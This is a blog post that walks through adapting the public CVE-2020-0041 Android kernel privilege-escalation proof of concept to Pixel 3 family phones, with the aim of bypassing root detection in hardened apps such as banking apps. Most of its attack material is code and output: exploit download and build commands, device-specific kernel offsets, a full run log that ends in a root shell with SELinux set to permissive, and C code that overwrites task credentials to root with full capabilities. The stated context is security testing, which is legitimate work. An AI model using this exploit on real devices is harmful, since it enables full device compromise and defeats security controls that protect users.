+++ 
title = "Bypassing root detection on Pixel 3 devices" 
date = "2022-02-27" 
author = "Joan Calabrés"  
description = "Adapting the CVE-2020-0041 privilege escalation exploit for Pixel 3 family devices in order to bypass root detection." 
+++

There are different root frameworks that can be used on Android in order to obtain root privileges. Usually, during Android application security evaluations, root detection is tested in different ways. Application countermeasures such as root detection are easy to bypass in most of the Android applications and sometimes without the use of reverse engineering techniques; however, as I've been seen during the analysis of banking applications, bypassing root detection on these applications can be hard and time consuming due high obfuscation and countermeasures applied.

A common procedure in the industry is the adaptation of privilege escalation exploits that are not detectable by most of the applications. In this post I will explain how to adapt [bluefrostsecurity](https://labs.bluefrostsecurity.de/blog/2020/04/08/cve-2020-0041-part-2-escalating-to-root/) **CVE-2020-0041** PoC for Pixel 3 to all the Pixel3 family devices. Furthermore, I will provide an improvement to obtain a non-limited root shell. 

## Table of Contents
- [Table of Contents](#table-of-contents)
- [Requirements](#requirements)
- [Adapting the exploit](#adapting-the-exploit)
- [Testing the exploit](#testing-the-exploit)
- [Issues & improvements](#issues-&-improvements)

## Requirements

* Download the **CVE-2020-0041** PoC exploit that we will be using for the modifications:

```bash
git clone https://github.com/bluefrostsecurity/CVE-2020-0041
```

* In order to adapt the exploit for any Pixel 3 device, the specific Pixel 3 vulnerable firmware **(QQ1A.200205.002)** needs to be downloaded from [official website](https://developers.google.com/android/images). A list of the specific devices links can be found below:

    * [Pixel 3 XL](https://dl.google.com/dl/android/aosp/crosshatch-qq1a.200205.002-factory-3e5c17fd.zip)

    * [Pixel 3a XL](https://dl.google.com/dl/android/aosp/bonito-qq1a.200205.002-factory-238bc80e.zip)

    * [Pixel 3a](https://dl.google.com/dl/android/aosp/sargo-qq1a.200205.002-factory-36d5179f.zip)

* Download [abootimg](https://github.com/ggrandou/abootimg) and compile it:

```bash
git clone https://github.com/ggrandou/abootimg
cd abootimg
make
```

* Download and install [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) tool using python pip:

```bash
sudo apt install python3-pip
sudo pip3 install --upgrade lz4 git+https://github.com/marin-m/vmlinux-to-elf
```

* In addition, we will need the **Android NDK** in our path in order to compile the exploit. As an example, I have this line on my .zshrc file.

```bash
export NDK="/home/calabres/NDK"
```

## Adapting the exploit

1. First of all we need to extract the compressed kernel image from the boot.img. For that, we will use the already downloaded tool **abootimg**.

```bash
./abootimg -x [path_to_boot_img]
```

The produced zImage, is an image that contains the compressed Android Kernel.

2. In order to obtain an uncompressed image of the Kernel that contains correct symbols and offsets, use the [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) tool.

```bash
vmlinux-to-elf [path_to_zImage] kernel.elf
```

3. Use the disassembler of your preference to find the labels related with the exploit offsets found in exploit.c. The labels to find inside the kernel are the following:

```c
SELINUX_ENFORCING_OFFSET 
MEMSTART_ADDR_OFFSET 
SYSCTL_TABLE_ROOT_OFFSET
PROC_DOUINTVEC_OFFSET
INIT_TASK_OFFSET
INIT_CRED_OFFSET
OFFSET_PIPE_FOP
```

4. Change exploit.c offsets for the offsets found in your device kernel image, in my case Pixel 3a offsets are:

```c
#define SELINUX_ENFORCING_OFFSET 0x2ffe000
#define MEMSTART_ADDR_OFFSET 0x23a6390
#define SYSCTL_TABLE_ROOT_OFFSET 0x2dda178
#define PROC_DOUINTVEC_OFFSET 0x19e8758
#define INIT_TASK_OFFSET 0x2da1e00L
#define INIT_CRED_OFFSET 0x2db0238
#define OFFSET_PIPE_FOP 0x2173650
```

## Testing the exploit 

>The exploit can be built by simply running "make" with the Android NDK in the path. It can also be pushed to a phone attached with adb by doing "make all push". Now just run /data/local/tmp/poc from an adb shell to see the exploit running:

{{< code language="bash" title="Exploit execution output" id="1" expand="Show" collapse="Hide" isCollapsed="true" >}}
[+] Mapped 200000
[+] selinux_enforcing before exploit: 1
[+] pipe file: 0xffffffd9c67c7700
[*] file epitem at ffffffda545d7d00
[*] Reallocating content of 'write8_inode' with controlled data.[DONE]
[+] Overwriting 0xffffffd9c67c7720 with 0xffffffda545d7d50...[DONE]
[*] Write done, should have arbitrary read now.
[+] file operations: ffffff97df1af650
[+] kernel base: ffffff97dd280000
[*] Reallocating content of 'write8_selinux' with controlled data.[DONE]
[+] Overwriting 0xffffff97dfe24000 with 0x0...[DONE]
[*] init_cred: ffffff97dfc300a0
[+] memstart_addr: 0xffffffe700000000
[+] First level entry: ceac5003 -> next table at ffffffd9ceac5000
[+] Second level entry: f173c003 -> next table at ffffffd9f173c000
[+] sysctl_table_root = ffffff97dfc5a3f8
[*] Reallocating content of 'write8_sysctl' with controlled data.[DONE]
[+] Overwriting 0xffffffda6da8d868 with 0xffffffda49ced000...[DONE]
[+] Injected sysctl node!
[*] Node write8_inode, pid 7058, kaddr ffffffda0723f900
[*] Replaced sendmmsg dangling reference
[*] Replaced sendmmsg dangling reference
[*] Replaced sendmmsg dangling reference
[*] Node write8_selinux, pid 6848, kaddr ffffffd9c9fa2400
[*] Replaced sendmmsg dangling reference
[*] Replaced sendmmsg dangling reference
[*] Replaced sendmmsg dangling reference
[*] Node write8_sysctl, pid 7110, kaddr ffffffda67e7d180
[*] Replaced sendmmsg dangling reference
[*] Replaced sendmmsg dangling reference
[*] Replaced sendmmsg dangling reference
[+] Cleaned up sendmsg threads
[*] epitem.next = ffffffd9c67c7720
[*] epitem.prev = ffffffd9c67c77d8
^[[*] Launching privileged shell
root_by_cve-2020-0041:/ # id   
uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
root_by_cve-2020-0041:/ # getenforce
Permissive
root_by_cve-2020-0041:/ # 
{{< /code >}}

## Issues & improvements

After the adaptation of the exploit and its execution, you will obtain a root shell; however, this root shell is very limited and you will have some problems executing binaries and creating files. 

Finding on the Internet I found the issue: *you need to patch the security context of the root user.*

During the exploit execution the process executed need to be patched with the correct security context for the root user. The next function is used to patch the credentials of a specific address:


{{< code language="bash" title="Patching task credentials" id="2" expand="Show" collapse="Hide" isCollapsed="true" >}}
```c
void patch_task_cred(uint64_t cred_addr, uint32_t init_sid)
{
    uint64_t val;
    struct cred *cred = (void *)cred_addr;
    struct task_security_struct *sec;

    if (cred == NULL)
        return;

    val = 0;
    write32((uint64_t)&cred->uid, val);
    write32((uint64_t)&cred->gid, val);
    write32((uint64_t)&cred->suid, val);
    write32((uint64_t)&cred->sgid, val);
    write32((uint64_t)&cred->euid, val);
    write32((uint64_t)&cred->egid, val);
    write32((uint64_t)&cred->fsuid, val);
    write32((uint64_t)&cred->fsgid, val);
    write32((uint64_t)&cred->securebits, val);

    val = ~(0UL);
    write64((uint64_t)&cred->cap_inheritable, val);
    write64((uint64_t)&cred->cap_permitted, val);
    write64((uint64_t)&cred->cap_effective, val);
    write64((uint64_t)&cred->cap_bset, val);
    //write64((uint64_t)&cred->cap_ambient, val);

    sec = (void *)read64((uint64_t)&cred->security);

    if (sec != NULL) {
        write32((uint64_t)&sec->osid, init_sid);
        write32((uint64_t)&sec->sid, init_sid);
    }
}
```
{{< /code >}}
